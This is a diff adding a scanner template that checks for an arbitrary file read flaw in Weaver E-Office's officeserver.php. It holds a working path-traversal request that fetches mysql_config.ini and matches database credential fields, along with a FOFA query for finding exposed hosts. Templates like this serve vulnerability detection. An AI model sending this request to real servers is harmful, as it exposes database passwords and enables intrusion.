@@ -1,0 +1,25 @@
+id: weaver-eoffice-officeserver-fileread
+
+info:
+  name: 泛微OA E-Office officeserver.php 任意文件读取漏洞
+  author: zan8in
+  severity: high
+  verified: true
+  description: |-
+    泛微OA E-Office officeserver.php文件存在任意文件读取漏洞，攻击者通过漏洞可以下载服务器上的任意文件
+    fofa: app="泛微-EOffice"
+  tags: weaver,eoffice,fileread
+  created: 2023/06/23
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /iweboffice/officeserver.php?OPTION=LOADFILE&FILENAME=../mysql_config.ini
+    expression: |
+      response.status == 200 && 
+      response.body.bcontains(b'dataurl') && 
+      response.body.bcontains(b'datauser') && 
+      response.body.bcontains(b'datapassword') && 
+      response.body.bcontains(b'dataname')
+expression: r0()
